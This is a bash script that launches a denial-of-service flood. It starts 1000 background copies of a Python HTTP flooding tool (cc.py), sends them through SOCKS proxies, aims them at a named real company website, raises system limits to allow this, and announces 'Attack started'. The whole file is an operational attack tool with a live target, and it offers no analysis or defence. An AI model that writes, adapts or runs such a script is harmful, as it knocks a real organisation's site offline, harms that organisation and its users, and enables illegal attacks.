#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="PYTHONIOENCODING=utf-8 python3 cc.py -url https://www.groupesylvagreg.fr/ -v 4 -s 60"


#number of process that you want
process=1000

#change the system limit
ulimit -n 3200

echo Attack started
for ((i=1;i<=$process;i++))
do
  PYTHONIOENCODING=utf-8 python3 cc.py -url https://www.groupesylvagreg.fr/ -v 4 -s 60 >/dev/null &
  sleep 0.1
done
